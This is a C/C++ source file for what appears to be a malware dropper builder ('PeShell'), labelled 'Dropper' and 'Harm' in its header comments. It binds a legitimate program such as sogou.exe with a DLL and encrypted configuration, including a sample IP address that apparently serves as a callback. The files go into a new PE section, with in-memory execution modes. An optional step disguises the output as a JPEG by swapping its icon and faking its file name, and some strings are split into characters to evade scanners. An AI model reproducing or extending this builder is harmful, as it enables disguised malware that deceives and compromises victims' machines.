
//http://www.virustotal.com
//http://www.virscan.org
//Dropper 
//Harm

#include <windows.h>
#include <stdio.h>
#include "Section.h"
#include "Resource.h"
#include "ForgeFilename.h"
#include "SetIcon.h"
#include <stdlib.h>
#include "Public.h"
#include <string.h>
#include "crypto.h"
#include "test.h"
#include "PEParser.h"
#include "Resource.h"
#include "crypto.h"

#define CONFIG_FILENAME					"config.dat"

#define TEMPLATE_TEMPORARY_FILENAME		"test.dat"

#define _CONSOLE

#ifdef _CONSOLE

int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp) {

#ifdef _DEBUG
	test();
#endif

	int ret = 0;

	if (argc < 3)
	{
		printf("example:PeShell -b sogou.exe sbiedll.dll -f c:\\users -c params.dat -o out.exe\r\n");

		printf("example:PeShell -b sogou.exe sbiedll.dll -f c:\\users -p jy20200729 47.116.51.29 -o out.exe\r\n");

		printf("example:PeShell -ber sogou.exe sbiedll.dll -c params.dat -o out.exe\r\n");

		printf("example:PeShell -re sogou.exe -c params.dat -o out.exe\r\n");

		printf("example:PeShell -rd sogou.dll -c params.dat -o out.dll\r\n");

		printf("param error\r\n");
		ret = getchar();
		return -1;
	}

	unsigned char key[16] = { 0 };
	Crypto::getkey(key);
	string curpath = Public::getCurPath();
	ret = SetCurrentDirectoryA(curpath.c_str());

	char filelist[MAX_FILE_COUNT][MAX_PATH];
	memset(filelist, 0, MAX_FILE_COUNT * MAX_PATH);
	int type = 0;
	int paramscnt = 0;
	char szoutFn[MAX_PATH] = { 0 };
	//string dstcryptfn = "test.dat";
	//string dstcfgfn = "config.dat";

	int bRename = FALSE;

	int cpu_arch = PEParser::getPEArch((const char*)GetModuleHandleW(0));;

	string outpath = "";

	for (int i = 1; i < argc; i++)
	{
		char* str = argv[i];
		if (lstrcmpiA(str, "-b") == 0 )
		{
			type = BIND_RELEASE_EXE;

			for (int j = i + 1; j < i+3; j++)
			{
				lstrcpyA(filelist[paramscnt], argv[j]);
				paramscnt++;
			}

			i += 2;
			continue;
		}
		else if (lstrcmpiA(str, "-re") == 0)
		{
			printf("argv[%i]:%s\r\n", i, argv[i + 1]);

			type = MEM_RUN_EXE;
			lstrcpyA(filelist[paramscnt], argv[i + 1]);
			paramscnt++;
			i += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-rd") == 0)
		{
			type = MEM_RUN_DLL;
			lstrcpyA(filelist[paramscnt], argv[i + 1]);
			paramscnt++;
			i += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-o") == 0)
		{
			lstrcpyA(szoutFn, argv[i + 1]);
			i += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-f") == 0)
		{
			outpath = argv[i + 1];
			i += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-c") == 0)
		{
			Public::prepareCfg(argv[i + 1], CONFIG_FILENAME);
			lstrcpyA(filelist[paramscnt], CONFIG_FILENAME);
			paramscnt++;

			i += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-p") == 0)
		{

			if (i + 2 > argc) {
				printf("argument error\r\n");
				return -1;
			}
			Public::prepareParams(argv[i + 1], argv[i + 2],type, key,CONFIG_FILENAME);

			i += 2;

			lstrcpyA(filelist[paramscnt], CONFIG_FILENAME);
			paramscnt++;		
			continue;
		}
		else if (lstrcmpiA(str, "-rename") == 0)
		{
			bRename = TRUE;
			continue;
		}
		
	}

	if (szoutFn[0] == 0)
	{
		lstrcpyA(szoutFn, "OutTest.exe");
	}
	if (type == 0)
	{
		printf("command line something error!\r\n");
		ret = getchar();
		return -1;
	}
	if (cpu_arch == 0x014c)
	{

	}
	char secname[] = { '.','r','c','d','a','t','a',0 };

	string resultfn = Section::insertSection(type, cpu_arch, secname, filelist, paramscnt,outpath, szoutFn,key);
	if (resultfn == "")
	{
		printf("something error happened!\r\n");
		ret = getchar();
		return -1;
	}

	if (bRename) {
		char jpgico[] = { 'j','p','g','.','i','c','o',0 };
		ChangeIcon(resultfn.c_str(), jpgico);
		char jpg[] = { 'j','p','e','g',0 };
		unsigned short ch[] = {'香','港','之','路',0};
		string mystr = (char*)ch;
		FakeFilename::fakefn(resultfn, jpg, mystr);
	}

	printf("bind type:%d cpu arch:%x completed\r\n", type, cpu_arch);
	ExitProcess(0);
	return 0;
}
#else
int __stdcall wWinMain(HINSTANCE inst, HINSTANCE prev, PWSTR cmdline, int showmode) {
	HANDLE h = GetModuleHandle(0);
	return 0;
}
#endif




//array[x][y]在内存中是随着内存地址递增的,array[x] array[x+1] 差是16，why?
//*[]结构是指针数组
//*是数组，也就是存放地址的变量

void test() {


	Resource::getResource((DWORD)GetModuleHandle(0), "");
	return;
}